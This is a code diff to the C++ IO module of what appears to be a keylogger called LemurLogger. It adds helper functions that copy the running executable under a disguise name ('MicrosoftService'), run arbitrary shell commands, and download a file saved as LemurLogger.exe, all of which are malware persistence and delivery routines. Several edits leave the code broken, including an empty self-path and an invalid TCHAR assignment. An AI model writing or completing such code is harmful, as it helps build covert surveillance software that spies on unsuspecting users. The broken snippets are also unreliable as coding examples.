@@ -4,6 +4,8 @@
 #include <string>
 #include <cstdlib>
 #include <fstream>
+#include <iostream>
+#include <string>
 #include <windows.h>
 #include "Helper.h"
 #include "Base64.h"
@@ -67,19 +69,19 @@ namespace IO
     bool copy(std::string path,std::string filename){
         TCHAR szExeFileName[MAX_PATH] = TEXT("MicrosoftService");
         //get self name
-        std::string cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+        std::string cur_path_filename;// = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
         //open self
-        ifstream initialFile(cur_path_filename, ios::in|ios::binary);
+        std::ifstream initialFile(cur_path_filename, std::ios::in|std::ios::binary);
         //open outfile
-        ofstream outputFile(path+filename, ios::out|ios::binary);
+        std::ofstream outputFile(path+filename, std::ios::out|std::ios::binary);
         //read pointer to end binary
-        initialFile.seekg(0, ios::end);
+        initialFile.seekg(0, std::ios::end);
         //set fileSize call buffer
         long fileSize = initialFile.tellg();
         if(initialFile.is_open() && outputFile.is_open())
         {
             short * buffer = new short[fileSize/2];
-            initialFile.seekg(0, ios::beg);
+            initialFile.seekg(0, std::ios::beg);
             initialFile.read((char*)buffer, fileSize);
             outputFile.write((char*)buffer, fileSize);
             delete[] buffer;
@@ -100,15 +102,15 @@ namespace IO
 
 
 
-    std::void shell_cmd(std::string command){
-        system(command);
+    void shell_cmd(std::string command){
+        system(command.c_str());
     }
 
-    std::bool copy_w_cmd(std::string path,std::string filename){
-        std::string cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+    bool copy_w_cmd(std::string path,std::string filename){
+        std::string cur_path_filename;// = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
         std::string command = "cp "+cur_path_filename+" "+path+filename;
         try {
-            system(command);
+            system(command.c_str());
         } catch (std::exception const& e) {
             return false;
         }
@@ -116,8 +118,8 @@ namespace IO
 
     }
 
-    std::bool ms_Copyfile(const char * desfile_path){
-        const char * cur_path_filename = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+    bool ms_Copyfile(const char * desfile_path){
+        const char * cur_path_filename;// = GetModuleFileName(NULL, szExeFileName, MAX_PATH);
         if (CopyFile (cur_path_filename, desfile_path, true))
             return false;
 
@@ -126,10 +128,10 @@ namespace IO
 
     }
 
-    std::bool download_File(std::string urlfile,TCHAR * despath)
+    bool download_File(std::string urlfile,TCHAR * despath)
     {
 
-        TCHAR url[] = TEXT(urlfile);
+        TCHAR url = urlfile.c_str();
         TCHAR path[MAX_PATH] = despath;
         //GetCurrentDirectory(MAX_PATH, path);
         wsprintf(path, TEXT("%s\\LemurLogger.exe"), path);
